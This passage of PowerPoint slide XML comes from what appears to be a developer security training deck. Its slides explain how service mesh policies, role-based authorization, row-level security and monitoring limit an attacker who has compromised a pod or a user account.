            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>132</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8625027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50D8-671A-7DA1-1B9C-A959BCB90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0FF66-D8E0-356E-8436-60DEE837A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54916-C4D7-EA98-9545-7F77ECF5B0B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Service mesh configuration is not trivial.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A false sense of security (“we installed Istio, we’re secure now”) is dangerous.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Any path that bypasses the mesh is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>uncontrolled and unobserved</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>As a senior dev, you need to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>balance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> strong </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and rich policy against latency and resource usage.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Service Mesh Security Errors are mostly centered around human error - bypass, and misconfiguration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thought experiment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Imagine an attacker who has shell access inside one pod in your cluster.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Without a mesh:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>They can probably curl every internal service at will.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>With a mesh and strict policies:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>That pod’s service identity only has rights to the small subset of calls it actually needs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Everything else is denied or logged as suspicious.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5632AC02-C563-0246-887A-524A9E0433EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>133</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="375363147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58513-127F-665D-3FD3-F84E0EA77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5D87B-2CA6-BA5B-C079-A5BEF7B63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ADE14-3095-71B0-83C2-E67996BA102D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Service mesh configuration is not trivial.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A false sense of security (“we installed Istio, we’re secure now”) is dangerous.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Any path that bypasses the mesh is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>uncontrolled and unobserved</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>As a senior dev, you need to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>balance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> strong </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and rich policy against latency and resource usage.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Service Mesh Security Errors are mostly centered around human error - bypass, and misconfiguration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thought experiment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Imagine an attacker who has shell access inside one pod in your cluster.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Without a mesh:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>They can probably curl every internal service at will.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>With a mesh and strict policies:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>That pod’s service identity only has rights to the small subset of calls it actually needs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Everything else is denied or logged as suspicious.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34887357-801E-E04C-4783-265C0B6F9447}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>134</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="132135025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4FAA6-EA12-35C4-2F31-61C6A6B59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599C2-3C9F-4391-D3AA-C69567AC8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397C9-71F0-DA40-5044-96AE4A3C0BA5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(only A can call B)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{07C8DC05-0221-7A5F-70FD-D92BA7EE6E3D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>135</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="157712456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5E648-4BC9-4997-FE19-576C82440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3914A-6684-FB99-5C0B-9F71F1E87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899A0-14A4-549D-275E-16D73EA7EC78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Scenario:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Identity layer partially fails</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>User reused their password; attacker logs in successfully.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MFA? Maybe bypassed via phishing or not enabled for that user type.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Application layer kicks in</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The compromised account only has </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> role, not admin.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Authorization rules ensure:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No access to /admin routes.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Limited data per tenant/user.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Result: attacker’s reach is limited from the start.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Service / data layers kick in</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Even if the attacker hits internal APIs through the compromised session:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Service mesh policies restrict which services can talk where.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Data layer enforces row-level security: user 123 can’t read user 456’s records.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Monitoring layer kicks in</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Unusual access pattern detected:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1085850" lvl="2" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
